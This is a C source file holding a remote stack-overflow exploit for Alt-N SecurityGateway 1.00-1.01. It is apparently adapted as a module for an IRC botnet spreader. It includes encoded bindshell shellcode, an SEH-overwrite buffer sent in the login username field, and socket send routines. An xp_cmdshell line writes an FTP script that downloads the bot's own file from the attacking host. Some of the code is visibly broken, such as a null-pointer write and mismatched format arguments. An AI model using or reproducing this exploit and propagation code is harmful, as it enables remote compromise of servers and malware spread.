/* Dreatica-FXP crew
* 
* ----------------------------------------
* Target         : Alt-N SecurityGateway v1.00-1.01 
* ----------------------------------------
* Exploit        : Alt-N SecurityGateway v1.00-1.01 Remote Stack Overflow Exploit
* Exploit date   : 11.06.2008-14.06.2008
* Exploit writer : Heretic2 (heretic2x@gmail.com)
* OS             : Windows ALL 
* Crew           : Dreatica-FXP
* ----------------------------------------
* Details        : Obtain the overflow and crash the application is peace a cake job.
*                  To make a wroking code execution here is a hell. First we can see that
*                  the username before overflow the buffer pass through some functions, 
*                  that changes and restrict some useful chars. Firstly the beffer gets 
*                  lowered so the overflow should not contain upper chars  :( . So i decided 
*                  to use some encoders for the payload like nonupper and non alpha from MSF.
*                  The nonupper use the `@` (0x40) char which the app doesn't eat at all.
*                  The nonalpha encoder in decoder code and the generated body contained 
*                  always the 0xC0, 0xC1, 0x80, 0x81 which were translated to 0xE0, 0xE1, 
*                  0x90, 0x91. Don't know, may be this chars translation was due to my russian locale.
*                  After few days of work i have comed with the required bindshell which bypass
*                  all restricted chars and executes. Thx to skylined, for his alpha tool. 
* Bad chars      : 0x00 0x40 0x41 0x42 0x43 0x44 0x45 0x46 0x47 0x48 0x49 0x4A 0x4B 0x4C 0x4D 0x4E
*                  0x4F 0x50 0x51 0x52 0x53 0x54 0x55 0x56 0x57 0x58 0x59 0x5A 0x40 0x7b 0xAA 0xC0
*                  0xC1 0xC2 0x80 0x81
* ----------------------------------------
* Thanks to:
*       1. securfrog               ( <securfrog [at] gmail.com>      )
*       2. ALPHA 2: Zero-tolerance ( <skylined [at] edup.tudelft.nl> ) 
*       3. The Metasploit project  ( http://metasploit.com           ) 
*       4. Dreatica-FXP crew       ( http://www.dreatica-fxp.com     )
************************************************************************************
* This was written for educational purpose only. Use it at your own risk. Author will be not be 
* responsible for any damage, caused by that code.
*/

#include "Include.h"
#include "Hell.h"
#include "externs.h"

#pragma comment(lib,"ws2_32")


void print_info_banner_line(const char * key, const char * val);

void extract_ip_and_port( char * &remotehost, int * port, char * str);
int  fill_payload_args(int sh, int bport, char * reverseip, int reverseport, struct h2readyp * xx);

int hr2_connect(char * remotehost, int port, int timeout);
int hr2_udpconnect(char * remotehost, int port,  struct sockaddr_in * addr, int timeout);
int hr2_updsend(char * remotehost, unsigned char * buf, unsigned int len, int port, struct sockaddr_in * addr, int timeout);
int execute(struct _buf * abuf, char * remotehost, int port);

struct _buf 
{
	unsigned char * ptr;
	unsigned int size;
};
int construct_shellcode(int sh, struct _buf * shf, int target);
int construct_buffer(struct _buf * shf, int target, struct _buf * abuf);



int getopt(int argc, char *argv[], char *optstring);
char	*optarg;	
int		optind = 0, opterr; 



struct {
	const char * name;
	int length;
	char *shellcode;	
}shellcodes[]={ 	
	 {"Bindshell, port 9998", 743, 

		"\x6a\x20\x5b\x93\xf7\xe0\x91\xe8\xff\xff\xff\xff\x30\x5e\x5e\x66"
		"\x8b\x7e\x22\x97\x3c\x60\x7c\x07\x2c\x20\x66\x93\x88\x5e\x22\x83"
		"\xee\xff\xe2\xeb\xe8\xff\xff\xff\xff\x36\x5b\x5b\x93\x91\x83\xe9"
		"\xf8\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x71\x7a\x76\x74"
		"\x78\x33\x30\x76\x78\x34\x61\x70\x30\x61\x33\x68\x68\x30\x61\x30"
		"\x30\x61\x62\x61\x61\x62\x74\x61\x61\x71\x32\x61\x62\x32\x62\x62"
		"\x30\x62\x62\x78\x70\x38\x61\x63\x6a\x6a\x69\x6b\x6c\x32\x6a\x6a"
		"\x6b\x70\x6d\x6a\x68\x7a\x79\x6b\x6f\x6b\x6f\x6b\x6f\x33\x70\x6c"
		"\x6b\x72\x6c\x36\x64\x71\x34\x6c\x6b\x71\x75\x77\x6c\x6c\x6b\x73"
		"\x6c\x73\x35\x33\x68\x35\x71\x7a\x6f\x6c\x6b\x70\x6f\x35\x68\x6c"
		"\x6b\x71\x6f\x67\x70\x75\x71\x6a\x6b\x77\x39\x6c\x6b\x77\x64\x6c"
		"\x6b\x75\x71\x7a\x6e\x76\x71\x69\x70\x6d\x69\x6e\x6c\x6b\x34\x69"
		"\x70\x72\x74\x63\x37\x6f\x31\x38\x6a\x74\x6d\x35\x71\x79\x72\x6a"
		"\x6b\x6b\x64\x77\x6b\x71\x64\x67\x74\x67\x78\x32\x75\x6d\x35\x6c"
		"\x6b\x71\x6f\x77\x74\x35\x71\x6a\x6b\x32\x66\x6c\x6b\x74\x6c\x70"
		"\x6b\x6c\x6b\x71\x6f\x35\x6c\x75\x71\x6a\x6b\x75\x73\x66\x6c\x6c"
		"\x6b\x6b\x39\x62\x6c\x76\x64\x75\x6c\x33\x71\x6f\x33\x66\x71\x79"
		"\x6b\x75\x34\x6c\x6b\x71\x73\x36\x70\x6c\x6b\x71\x70\x74\x6c\x6c"
		"\x6b\x72\x70\x75\x6c\x6e\x6d\x6c\x6b\x71\x70\x35\x78\x71\x6e\x73"
		"\x78\x6c\x6e\x70\x6e\x64\x6e\x7a\x6c\x30\x70\x6b\x6f\x78\x76\x35"
		"\x36\x76\x33\x32\x66\x33\x78\x70\x33\x77\x62\x72\x68\x72\x77\x34"
		"\x33\x76\x72\x71\x6f\x70\x74\x6b\x6f\x78\x70\x62\x68\x38\x6b\x6a"
		"\x6d\x6b\x6c\x77\x6b\x66\x30\x6b\x6f\x78\x76\x71\x6f\x6b\x39\x6a"
		"\x65\x73\x76\x6d\x71\x7a\x6d\x73\x38\x64\x62\x70\x75\x62\x6a\x35"
		"\x72\x6b\x6f\x6e\x30\x72\x68\x78\x79\x75\x79\x6b\x65\x6e\x6d\x66"
		"\x37\x6b\x6f\x79\x66\x36\x33\x70\x73\x71\x63\x71\x63\x70\x73\x71"
		"\x73\x71\x63\x31\x73\x36\x33\x6b\x6f\x68\x70\x32\x66\x65\x38\x71"
		"\x37\x74\x6e\x72\x66\x71\x63\x6b\x39\x6b\x71\x6c\x75\x73\x78\x6f"
		"\x74\x75\x6a\x74\x30\x6f\x37\x30\x77\x6b\x6f\x79\x66\x32\x6a\x64"
		"\x70\x36\x31\x31\x65\x6b\x6f\x6e\x30\x75\x38\x6e\x64\x6e\x6d\x76"
		"\x6e\x6b\x79\x71\x67\x6b\x6f\x78\x76\x70\x73\x70\x75\x6b\x6f\x78"
		"\x70\x65\x38\x6b\x75\x31\x79\x6c\x66\x70\x69\x30\x77\x6b\x6f\x6e"
		"\x36\x70\x70\x31\x64\x71\x64\x76\x35\x6b\x6f\x78\x70\x6c\x73\x72"
		"\x68\x6d\x37\x63\x69\x39\x76\x32\x79\x71\x67\x6b\x6f\x6e\x36\x71"
		"\x65\x6b\x6f\x78\x70\x73\x76\x73\x7a\x35\x34\x32\x66\x72\x68\x75"
		"\x33\x72\x6d\x6d\x79\x6b\x75\x72\x6a\x76\x30\x76\x39\x71\x39\x68"
		"\x6c\x6b\x39\x6d\x37\x72\x6a\x30\x64\x6b\x39\x6b\x72\x76\x71\x6f"
		"\x30\x7a\x73\x6e\x6a\x6b\x6e\x70\x62\x76\x6d\x6b\x6e\x67\x32\x36"
		"\x6c\x6a\x33\x6c\x6d\x33\x6a\x76\x78\x6e\x6b\x6e\x6b\x6e\x6b\x63"
		"\x78\x73\x62\x6b\x6e\x6e\x73\x74\x76\x6b\x6f\x62\x75\x70\x64\x6b"
		"\x6f\x38\x76\x71\x6b\x76\x37\x76\x32\x30\x71\x30\x71\x70\x71\x72"
		"\x6a\x65\x71\x30\x71\x30\x71\x30\x75\x70\x71\x6b\x6f\x78\x70\x75"
		"\x38\x6e\x6d\x6e\x39\x74\x65\x78\x6e\x70\x73\x6b\x6f\x6e\x36\x73"
		"\x7a\x6b\x6f\x6b\x6f\x36\x77\x6b\x6f\x6e\x30\x6c\x6b\x36\x37\x6b"
		"\x6c\x6b\x33\x69\x74\x75\x34\x6b\x6f\x38\x76\x66\x32\x6b\x6f\x38"
		"\x70\x33\x78\x7a\x70\x6c\x6a\x63\x34\x71\x6f\x66\x33\x6b\x6f\x6e"
		"\x36\x6b\x6f\x68\x70\x61\x61"
	 },	  
	{NULL, 0, NULL}
};
 


 
struct _target{
	const char *t ;
	unsigned long ret ;
} targets[]=
{	
	{"Alt-N SecurityGateway 1.00/1.01 universal", 0x67672190 }, 
	{NULL,                                        0x00000000 }
};


unsigned char payloadbuffer[10000], a_buffer[10000];
long dwTimeout=5000;
int timeout=5000;


void SecGate(ExploitInfo_s* pExploitInfo)
{
	char c,*remotehost=NULL,temp1[100];
	int sh,port=4000,itarget=0;
	struct _buf  fshellcode, sbuffer;

	
	WSADATA wsa;
	WSAStartup(MAKEWORD(2,0), &wsa);
	sh=0;	

    *remotehost =  pExploitInfo->dwRemoteIp;
	sprintf(temp1, "%d", port);
	sprintf(temp1, "%d", 9998);
	fflush(stdout);

	memset(payloadbuffer, 0, sizeof(payloadbuffer));

	fshellcode.ptr=payloadbuffer;
	fshellcode.size=0;	

	memset(a_buffer, 0, sizeof(a_buffer));
	sbuffer.ptr=a_buffer;
	sbuffer.size=0;

	if(!construct_shellcode(sh, &fshellcode, itarget))
	{
		WSACleanup();
	}

	
	if(!construct_buffer(&fshellcode, itarget, &sbuffer))
	{
		WSACleanup();
	}
	

	if(!execute(&sbuffer, remotehost, port))
	{
		int usFtpdPort = RandomNumber(1024, 65535);
		char		szFtpFileName[10],szCommand[1024];
		_snprintf(szFtpFileName, sizeof(szFtpFileName), "%s.txt",RandomNumber(1, 6));
		
		_snprintf((char*)szCommand, sizeof(szCommand), "EXEC master..xp_cmdshell 'echo open %s %d >> %s &echo user %s %s >> %s &echo get %s >> %s &echo quit >> %s &ftp -n -s:%s\r\n'",
			GetIP(dwSHellcodeIpAddress), usFtpdPort, szFtpFileName, 
			RandomNumber(4, 10), RandomNumber(4, 10),
			szFtpFileName, BOT->cIRC.cConf.cFileName.c_str(), szFtpFileName, szFtpFileName, 
				szFtpFileName);
		WSACleanup();
	}

	WSACleanup();
}

int construct_shellcode(int sh, struct _buf * shf, int target)
{
	memcpy(shf->ptr, shellcodes[sh].shellcode, shellcodes[sh].length);
	shf->size=shellcodes[sh].length;

	return 1;
}



char templ1[] =  "POST /SecurityGateway.dll HTTP/1.0\r\n"
"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*\r\n"
"Accept-Language: ru\r\n"
"Content-Type: application/x-www-form-urlencoded\r\n"
"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\r\n"
"Content-Length: %d\r\n\r\n";
char templ2[]="RequestedPage=login&username=%s&passwd=world&lang=en&logon=Sign+In";

int encode_uri(char * in, int len, char * out, int *outlen)
{
	char *out2=out;
	int i;
	memset(out,0,*outlen);
	for(i=0;i<len;i++)
	{
		*out++='%';
		sprintf(out, "%.2x", (unsigned char)in[i]);
		out+=2;
	}
	*outlen=(int)(out-out2);
	return 0;
}



int construct_buffer(struct _buf * shf, int target, struct _buf * abuf)
{
	unsigned char * cp;
	char *lp ;
	char buf[10000], buf2[10000],rstr1[10000],rstr2[10000];
	int  olen;

	cp = abuf->ptr;

	memset(buf,0,sizeof(buf));
	memset(buf2,0,sizeof(buf2));
	memset(rstr1,0,sizeof(rstr1));
	memset(rstr2,0,sizeof(rstr2));

	lp=buf;	

		// overflow
	memset(lp,'\x61',476);
	lp+=476;	

		// jmp over seh
	*lp++='\x90';
	*lp++='\x90';
	*lp++='\xeb';
	*lp++='\x04';

		// replace SEH
	*lp++ = (char)((targets[target].ret      ) & 0xff);
	*lp++ = (char)((targets[target].ret >>  8) & 0xff);
	*lp++ = (char)((targets[target].ret >> 16) & 0xff);
	*lp++ = (char)((targets[target].ret >> 24) & 0xff);

	memset(lp,'\x90',1500);
	lp+=5;

	memcpy(lp, shf->ptr, shf->size);
	lp+=shf->size;


	olen = 1500;
	encode_uri(buf, (int)strlen(buf), buf2, &olen);
	sprintf(rstr2,templ2,buf2);
	sprintf(rstr1,templ1,strlen(rstr2));

	strcat((char*)cp,rstr1);
	strcat((char*)cp,rstr2);

	cp+=strlen((char*)cp);
	abuf->size=(int)(cp-abuf->ptr);
	return 1;
}


void extract_ip_and_port( char * &remotehost, int * port, char * str)
{
	if (strchr(str,':')==NULL)
	{
		remotehost=str;
	}else 
	{
		sscanf(strchr(str,':')+1, "%d", port);
		remotehost=str;
		*(strchr(remotehost,':'))='\0';
	}
}



int hr2_connect(char * remotehost, int port, int timeout)
{
	SOCKET s;
	struct hostent *host;
	struct sockaddr_in addr;
	TIMEVAL stTime;
	TIMEVAL *pstTime = NULL;
	fd_set x;
	int res;

	if (INFINITE != timeout) 
	{
		stTime.tv_sec = timeout / 1000;
		stTime.tv_usec = timeout % 1000;
		pstTime = &stTime;
	}

	host = gethostbyname(remotehost);
	if (!host) return SOCKET_ERROR;

	addr.sin_addr = *(struct in_addr*)host->h_addr;
	addr.sin_port = htons(port);
	addr.sin_family = AF_INET;

	s = socket(AF_INET, SOCK_STREAM, 0);
	if (s == SOCKET_ERROR)
	{
		closesocket(s);
		return SOCKET_ERROR;
	}

	unsigned long l = 1;
	ioctlsocket( s, FIONBIO, &l ) ;

	connect(s, (struct sockaddr*)&addr, sizeof(addr));

	FD_ZERO(&x);
	FD_SET(s, &x);

	res = select(NULL,NULL,&x,NULL,pstTime);
	if(res< 0) return SOCKET_ERROR;
	if(res==0) return 0;
	return (int)s;
}


int hr2_tcpsend(SOCKET s, unsigned char * buf, unsigned int len, int timeout)
{
	return send(s, (char *)buf, len, 0);
}

int hr2_tcprecv(SOCKET s, unsigned char * buf, unsigned int len, int timeout)
{
	TIMEVAL stTime;
	TIMEVAL *pstTime = NULL;
	fd_set xy;
	int res;

	if (INFINITE != timeout) 
	{
		stTime.tv_sec = timeout / 1000;
		stTime.tv_usec = timeout % 1000;
		pstTime = &stTime;
	}
	FD_ZERO(&xy);
	FD_SET(s, &xy);
	
	res = select(NULL,&xy,NULL,NULL,pstTime);

	if(res==0) return 0;
	if(res<0) return -1;

	return recv(s, (char *)buf, len, 0);
}

int execute(struct _buf * abuf, char * remotehost, int port)
{
	int x;
	SOCKET s ;
	char RECVB[10000];

	s = hr2_connect(remotehost, port, 10000);
	if(s==0)
	{
	//	printf("   [-] connect() timeout\n");
		return 0;
	}
	if(s==SOCKET_ERROR)
	{
	//	printf("   [-] Connection failed\n");
		return 0;
	}		
	x = hr2_tcpsend(s, abuf->ptr, abuf->size, 0);
//	printf("   [+] Sent %d out of %d bytes\n", x, abuf->size);

	x = hr2_tcprecv(s, (unsigned char *)RECVB, 1000, 0);
	
	closesocket(s);
	return 1;
}

// -----------------------------------------------------------------
// XGetopt.cpp  Version 1.2
// -----------------------------------------------------------------
int getopt(int argc, char *argv[], char *optstring)
{
	static char *next = NULL;
	if (optind == 0)
		next = NULL;

	optarg = NULL;

	if (next == NULL || *next == '\0')
	{
		if (optind == 0)
			optind++;

		if (optind >= argc || argv[optind][0] != '-' || argv[optind][1] == '\0')
		{
			optarg = NULL;
			if (optind < argc)
				optarg = argv[optind];
			return EOF;
		}

		if (strcmp(argv[optind], "--") == 0)
		{
			optind++;
			optarg = NULL;
			if (optind < argc)
				optarg = argv[optind];
			return EOF;
		}

		next = argv[optind];
		next++;		// skip past -
		optind++;
	}

	char c = *next++;
	char *cp = strchr(optstring, c);

	if (cp == NULL || c == ':')
		return '?';

	cp++;
	if (*cp == ':')
	{
		if (*next != '\0')
		{
			optarg = next;
			next = NULL;
		}
		else if (optind < argc)
		{
			optarg = argv[optind];
			optind++;
		}
		else
		{
			return '?';
		}
	}

	return c;
}
// -----------------------------------------------------------------
// -----------------------------------------------------------------
// -----------------------------------------------------------------

void print_info_banner_line(const char * key, const char * val)
{
	char temp1[100], temp2[100];

	memset(temp1,0,sizeof(temp1));	
	memset(temp1, '\x20' , 58 - strlen(val) -1);	

	memset(temp2,0,sizeof(temp2));
	memset(temp2, '\x20' , 8 - strlen(key));	
//	printf(" #  %s%s: %s%s# \n", key, temp2, val, temp1);	

}


